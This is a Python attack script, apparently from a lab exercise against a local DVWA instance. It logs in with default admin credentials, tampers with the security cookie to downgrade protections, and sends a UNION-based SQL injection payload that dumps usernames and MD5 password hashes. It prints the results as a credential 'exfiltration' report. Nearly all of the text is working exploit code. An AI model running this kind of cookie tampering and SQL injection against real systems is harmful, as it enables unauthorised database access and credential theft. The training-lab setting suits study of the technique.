
import requests
import re

s = requests.Session()

# Login
r = s.get("http://localhost:28080/login.php")
token = re.search(r"user_token['\s]*value=['\"]([^'\"]+)", r.text).group(1)
r = s.post("http://localhost:28080/login.php", data={
    "username": "admin",
    "password": "password",
    "Login": "Login",
    "user_token": token
}, allow_redirects=True)

# Force security=low via cookie tampering
for c in list(s.cookies):
    if c.name == 'security':
        s.cookies.clear(c.domain, c.path, c.name)
s.cookies.set("security", "low", domain="localhost.local", path="/")

print("="*70)
print("COOKIE TAMPERING ATTACK: Extracting DVWA Database Credentials")
print("="*70)

# UNION-based SQLi to extract usernames and password hashes
payload = "' UNION SELECT user,password FROM users -- "
r = s.get("http://localhost:28080/vulnerabilities/sqli/", params={
    "id": payload,
    "Submit": "Submit"
})

# Parse the response
results = re.findall(r"First name:\s*(.*?)<br\s*/?>", r.text)
surnames = re.findall(r"Surname:\s*(.*?)<br\s*/?>", r.text)

if results and surnames:
    print(f"\n[+] UNION SQL Injection Successful - {len(results)} credential pairs extracted")
    print("\nDVWA USER DATABASE DUMP:")
    print("-" * 70)
    print(f"{'Username':<20} {'MD5 Password Hash':<40}")
    print("-" * 70)
    
    # First result is the injection point itself
    for i, (username, pwd_hash) in enumerate(zip(results, surnames)):
        username = username.strip()
        pwd_hash = pwd_hash.strip()
        # Clean up HTML artifacts
        if '</pre>' in username:
            username = username.split('</pre>')[0]
        if '</pre>' in pwd_hash:
            pwd_hash = pwd_hash.split('</pre>')[0]
        print(f"{username:<20} {pwd_hash:<40}")
    
    print("-" * 70)
    print(f"\n[+] Admin password hash: {[h for u,h in zip(results,surnames) if 'admin' in u.lower()][0].split('</pre>')[0] if any('admin' in u.lower() for u in results) else 'NOT FOUND'}")
    print("[+] Attack surface: Blue Team's 'impossible' level BYPASSED via cookie tampering")
    print("[+] Impact: Complete database exfiltration despite 'hardening'")
else:
    print("[-] UNION extraction failed")
    print(f"    Response length: {len(r.text)} bytes")

